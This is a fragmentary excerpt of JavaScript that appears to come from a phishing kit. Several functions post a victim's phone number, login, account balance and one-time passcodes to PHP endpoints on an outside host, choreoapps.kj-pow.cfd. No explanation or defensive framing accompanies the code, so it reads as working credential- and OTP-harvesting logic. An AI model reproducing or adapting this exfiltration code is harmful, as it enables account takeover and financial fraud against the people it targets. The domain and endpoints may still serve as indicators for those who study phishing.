function sendHp() {
   ...
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/17/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/17/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/17/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {        
   ...
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/17/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/17/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/17/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/17/otpblm.php',
      type: 'POST',
